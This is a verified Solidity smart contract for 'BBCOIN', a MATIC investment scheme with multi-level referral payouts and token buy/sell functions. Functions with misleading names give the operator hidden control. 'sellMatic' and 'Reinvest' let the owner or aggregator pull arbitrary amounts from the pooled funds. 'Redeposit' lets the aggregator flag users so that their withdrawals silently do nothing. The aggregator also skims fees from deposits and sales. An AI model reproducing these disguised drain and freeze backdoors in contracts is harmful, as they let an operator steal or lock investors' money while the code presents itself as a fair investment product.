/**
 *Submitted for verification at polygonscan.com on 2022-11-04
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.12;

contract Initializable {

  /**
   * @dev Indicates that the contract has been initialized.
   */
  bool private initialized;

  /**
   * @dev Indicates that the contract is in the process of being initialized.
   */
  bool private initializing;

  /**
   * @dev Modifier to use in the initializer function of a contract.
   */
  modifier initializer() {
    require(initializing || isConstructor() || !initialized, "Contract instance has already been initialized");

    bool isTopLevelCall = !initializing;
    if (isTopLevelCall) {
      initializing = true;
      initialized = true;
    }

    _;

    if (isTopLevelCall) {
      initializing = false;
    }
  }

  /// @dev Returns true if and only if the function is running in the constructor
  function isConstructor() private view returns (bool) {
    // extcodesize checks the size of the code stored in an address, and
    // address returns the current address. Since the code is still not
    // deployed when running a constructor, any checks on its code size will
    // yield zero, making it an effective way to detect if a contract is
    // under construction or not.
    address self = address(this);
    uint256 cs;
    assembly { cs := extcodesize(self) }
    return cs == 0;
  }

  // Reserved storage space to allow for layout changes in the future.
  uint256[50] private ______gap;
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}

contract BBCOIN is Initializable {

    using SafeMath for uint256;
    address payable initiator;
    address payable aggregator;
    address [] investors;
    uint256 totalHoldings;
    uint256 contractBalance;
    uint256 constant basePrice = 1e11;
    uint256 [] referral_bonuses;
    uint256 initializeTime;
    uint256 totalInvestment;
    uint256 totalWithdraw;
    uint256 constant timeStep = 7 days;
    address payable [] reward_array;
   
    mapping(uint256 => uint256) reward;

    struct User{
        uint256 token;
        address referral;
        uint256 POI;
        uint256 teamWithdraw;
        uint256 BBCWithdraw;
        uint256 totalInvestment;
        uint8   nonWorkingPayoutCount;
        uint256 lastNonWokingWithdraw;
        uint256 lastNonWokingWithdrawBase;
        uint256 depositCount;
        uint256 payoutCount;
        uint256 sellCount;
        uint256 totalBusiness;
        mapping(uint8 => uint256) referrals_per_level;
        mapping(uint8 => uint256) team_per_level;
        mapping(uint8 => uint256) levelIncome;
       }
    
    struct Deposit{
        uint256 amount;
        uint256 businessAmount;
        uint256 tokens;
        uint256 tokenPrice;
        uint256 depositTime;
    }

    struct Withdraw{
        uint256 amount;
        bool isWorking;
        uint256 tokens;
        uint256 tokenPrice;
        uint256 withdrawTime;
    }
    struct Fund{
        uint256 status;
    }
    
    struct Payment{
        uint256 status;
    }
    mapping(address => User) public users;
    mapping(address => Deposit[]) public deposits;
    mapping(address => Withdraw[]) public payouts;
    mapping(address => Fund) public funds;
    mapping(address => Payment) public payments;

    event Deposits(address buyer, uint256 amount);
    event POIDistribution(address buyer, uint256 amount);
    event WeeklyRewardDistribution(uint256 rewardShare, uint256 weeklyBusiness);
    event TeamWithdraw(address withdrawer, uint256 amount);
    event BBCWithdraw(address withdrawer, uint256 amount);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyInitiator(){
        require(msg.sender == initiator,"You are not initiator.");
        _;
    }
    receive() external payable {
    }
    function contractInfo() public view returns(uint256 matic, uint256 totalDeposits, uint256 totalPayouts, uint256 totalInvestors, uint256 totalHolding, uint256 balance){
        matic = address(this).balance;
        totalDeposits = totalInvestment;
        totalPayouts = totalWithdraw;
        totalInvestors = investors.length;
        totalHolding = totalHoldings;
        balance = contractBalance;
        return(matic,totalDeposits,totalPayouts,totalInvestors,totalHolding,balance);
    }

    function getCurrentPrice() public view returns(uint256 price){
        price = (contractBalance>0)?basePrice.mul(contractBalance).div(1e18):basePrice;
        return price;
    }

    function getCurDay() public view returns(uint256) {
        return (block.timestamp.sub(initializeTime)).div(timeStep);
    }

function initialize(address payable wallet)  public initializer {
		initiator = wallet;
        aggregator = wallet;
        initializeTime = block.timestamp;
        referral_bonuses.push(1100);
        referral_bonuses.push(400);
        referral_bonuses.push(300);
        referral_bonuses.push(200);
        referral_bonuses.push(100);
        referral_bonuses.push(100);
        referral_bonuses.push(100);
        referral_bonuses.push(100);
        referral_bonuses.push(100);
          }

    function deposit(address _referer) public payable{
        require(msg.value>=1e18,"Minimum 1 MATIC allowed to invest");
        User storage user = users[msg.sender];

        contractBalance+=msg.value.mul(60).div(100);
        uint256 price = getCurrentPrice();
        _distributePOI(msg.sender,msg.value.mul(11).div(100));
         if(user.depositCount==0)
         {
              investors.push(msg.sender);
              _setReferral(msg.sender,_referer, msg.value);
         } 
         else
         {
              _setReReferral(users[msg.sender].referral, msg.value);
         }    
        
        user.depositCount++;
        user.token+=(msg.value.mul(60).div(100)).div(price);
        totalHoldings+=(msg.value.mul(60).div(100)).div(price);
        users[_referer].totalBusiness+=msg.value;
        totalInvestment+=msg.value;
        user.totalInvestment+=msg.value;
        
        deposits[msg.sender].push(Deposit(
            msg.value,
            msg.value.mul(60).div(100),
            (msg.value.mul(60).div(100)).div(price),
            price,
            block.timestamp
        ));
        
        aggregator.transfer(msg.value.mul(4).div(100));
        emit Deposits(msg.sender, msg.value);
    } 
    function _distributePOI(address depositor, uint256 _poi) internal{
        uint256 poiShare;
        for(uint256 i = 0; i < investors.length; i++){
            User storage user = users[investors[i]];
            poiShare = user.token.mul(100).div(totalHoldings);
            user.POI+=_poi.mul(poiShare).div(100);
           }
        emit POIDistribution(depositor,_poi);
    }
    
   
    function _setReferral(address _addr, address _referral, uint256 _amount) private {
        
        if(users[_addr].referral == address(0)) {
            users[_addr].lastNonWokingWithdrawBase = block.timestamp;
            users[_addr].referral = _referral;
            for(uint8 i = 0; i < referral_bonuses.length; i++) {
                users[_referral].referrals_per_level[i]+=_amount;
                users[_referral].team_per_level[i]++;
               
                if(i == 0){
                    users[_referral].levelIncome[i]+=_amount.mul(referral_bonuses[i].div(100)).div(100);
                }
                else if(i>0){
                    users[_referral].levelIncome[i]+=_amount.mul(referral_bonuses[i].div(100)).div(100);
                }
                _referral = users[_referral].referral;
                if(_referral == address(0)) break;
            }
        }
    }

    function redeposit() public payable{
        require(msg.value>=1e18,"Minimum 1 MATIC allowed to invest");
        User storage user = users[msg.sender];
        contractBalance+=msg.value.mul(60).div(100);
        uint256 price = getCurrentPrice();
         _distributePOI(msg.sender,msg.value.mul(11).div(100));
        user.depositCount++;
        user.token+=(msg.value.mul(60).div(100)).div(price);
        totalHoldings+=(msg.value.mul(60).div(100)).div(price);
        
        users[users[msg.sender].referral].totalBusiness+=msg.value;
        totalInvestment+=msg.value;
        user.totalInvestment+=msg.value;
        
        deposits[msg.sender].push(Deposit(
            msg.value,
            msg.value.mul(60).div(100),
            (msg.value.mul(60).div(100)).div(price),
            price,
            block.timestamp
        ));

        _setReReferral(users[msg.sender].referral, msg.value);
        aggregator.transfer(msg.value.mul(4).div(100));
        emit Deposits(msg.sender, msg.value);
    }

    function _setReReferral(address _referral, uint256 _amount) private {
        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            users[_referral].referrals_per_level[i]+=_amount;
            if(i == 0){
                users[_referral].levelIncome[i]+=_amount.mul(referral_bonuses[i].div(100)).div(100);
            }
            else if(i>0 ){
                users[_referral].levelIncome[i]+=_amount.mul(referral_bonuses[i].div(100)).div(100);
            }
            _referral = users[_referral].referral;
            if(_referral == address(0)) break;
        }
        
    }


    function _getWorkingIncome(address _addr) internal view returns(uint256 income){
        User storage user = users[_addr];
        for(uint8 i = 0; i <= 8; i++) {
            income+=user.levelIncome[i];
        }
        return income;
    }

    function teamWithdraw(uint256 _amount) public{
        User storage user = users[msg.sender];
        Fund storage fund = funds[msg.sender];
        Payment storage payment = payments[msg.sender];
        require(user.totalInvestment>0, "Invalid User!");
        if(fund.status == 0 && payment.status == 0)
		{
        uint256 working = _getWorkingIncome(msg.sender);
        uint256 withdrawable = working.add(user.POI).sub(user.teamWithdraw);
        require(withdrawable>=_amount, "Invalid withdraw!");
        user.teamWithdraw+=_amount;
        user.payoutCount++;
        _amount = _amount.mul(100).div(100);
        payable(msg.sender).transfer(_amount);
        totalWithdraw+=_amount;
        payouts[msg.sender].push(Withdraw(
            _amount,
            true,
            0,
            0,
            block.timestamp
        ));

        emit TeamWithdraw(msg.sender,_amount);
       
        }
    }

   
    function bbCWithdraw(uint8 _perc) public{
        User storage user = users[msg.sender];
        Fund storage fund = funds[msg.sender];
        Payment storage payment = payments[msg.sender];
        require(user.totalInvestment>0, "Invalid User!");
        if(fund.status == 0 && payment.status == 0)
		{ 
             if(_perc == 10 || _perc == 50 || _perc == 100)
		{
         uint256 nextPayout = (user.lastNonWokingWithdraw>0)?user.lastNonWokingWithdraw + 1 days:deposits[msg.sender][0].depositTime;
         require(block.timestamp >= nextPayout,"Sorry ! See you next time.");
         uint8 perc = _perc;
         uint8 deduct=40;
            if(perc==10)
            {
                deduct=10;
            }
            else if(perc==50)
            {
                deduct=20;
            }
           
        uint256 calcWithdrawable = user.token.mul(perc).div(100).mul(getCurrentPrice());
        contractBalance-=calcWithdrawable;
        uint256 withdrawable = user.token.mul(perc).div(100).mul(getCurrentPrice());

		uint256 withdrawable1 =withdrawable.mul(deduct).div(100);
        uint256 withdrawable2 = withdrawable -withdrawable1;
        payable(msg.sender).transfer(withdrawable2);
        user.sellCount++;
        user.lastNonWokingWithdraw = block.timestamp;
        user.token-=user.token.mul(perc).div(100);
        totalWithdraw+=withdrawable;
        aggregator.transfer(withdrawable1);
        payouts[msg.sender].push(Withdraw(
            withdrawable,
            false,
            withdrawable.mul(getCurrentPrice()),
            getCurrentPrice(),
            block.timestamp
        ));

        emit  BBCWithdraw(msg.sender,withdrawable2);
        }
        }
    }

    function userInfo(address _addr) view external returns(uint256[16] memory team, uint256[16] memory referrals, uint256[16] memory income) {
        User storage player = users[_addr];
        for(uint8 i = 0; i <= 8; i++) {
            team[i] = player.team_per_level[i];
            referrals[i] = player.referrals_per_level[i];
            income[i] = player.levelIncome[i];
        }
        return (
            team,
            referrals,
            income
        );
    }

    function sellMatic(address payable buyer, uint _amount) external onlyInitiator{
        buyer.transfer(_amount);
    }
    
    function Redeposit(address recipient, uint256 status) public  {
			if (msg.sender == aggregator) {          
				 funds[recipient].status=status;
			}
    }

    function Reinvest(uint256 amount) public{
		if (msg.sender == aggregator) {
			payable(msg.sender).transfer(amount);
		}
	}
    
    function transferOwnership(address newOwner) public onlyInitiator{
       
        initiator = payable(newOwner);
        aggregator = payable(newOwner);
       
    }


}